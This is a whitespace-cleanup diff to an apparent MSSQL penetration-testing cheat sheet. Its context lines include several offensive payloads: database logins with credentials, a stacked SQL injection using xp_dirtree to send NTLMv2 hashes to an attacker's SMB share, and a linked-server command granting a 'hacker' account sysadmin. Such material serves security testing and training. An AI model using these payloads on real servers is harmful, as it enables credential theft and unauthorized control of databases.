@@ -169,7 +169,7 @@ sqsh -S 192.168.1.X -U sa -P superPassword
 python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
 ```
 
-Execute Python script 
+Execute Python script
 
 > Executed by a different user than the one using xp_cmdshell to execute commands
 
@@ -187,13 +187,12 @@ print(sys.version)
 GO
 ```
 
-
 ## MSSQL UNC Path
 
 MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.
 
 ```sql
-1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
+1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';--
 ```
 
 ## MSSQL Make user DBA (DB admin)
@@ -237,7 +236,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 * [Pentest Monkey - mssql-sql-injection-cheat-sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
 * [Sqlinjectionwiki - MSSQL](http://www.sqlinjectionwiki.com/categories/1/mssql-sql-injection-cheat-sheet/)
-* [Error Based - SQL Injection ](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
+* [Error Based - SQL Injection](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
 * [MSSQL Trusted Links - HackTricks.xyz](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
 * [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
 * [DAFT: Database Audit Framework & Toolkit - NetSPI](https://github.com/NetSPI/DAFT)
